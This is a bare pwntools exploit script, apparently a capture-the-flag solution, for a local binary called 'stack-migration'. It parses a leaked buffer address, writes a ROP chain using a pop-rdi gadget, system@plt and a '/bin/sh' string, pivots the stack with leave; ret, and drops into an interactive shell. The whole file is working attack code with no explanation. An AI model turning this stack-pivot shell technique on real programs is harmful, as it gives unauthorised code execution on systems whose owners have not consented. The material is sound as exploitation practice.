#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./stack-migration')
elf = ELF('./stack-migration')

p.recvuntil("Here's your gift: ")
buf_addr = int(p.recv(14),16)
prdi_ret = 0x400783
system_plt = 0x400560
leave_ret = 0x40071d

payload  = p64(prdi_ret) + p64(buf_addr+0x18) + p64(system_plt) + '/bin/sh\x00'
payload += p64(buf_addr-0x8) + p64(leave_ret)

#gdb.attach(p)
#pause()

p.recvuntil("Please pwn me :)\n")
p.send(payload)
p.interactive()

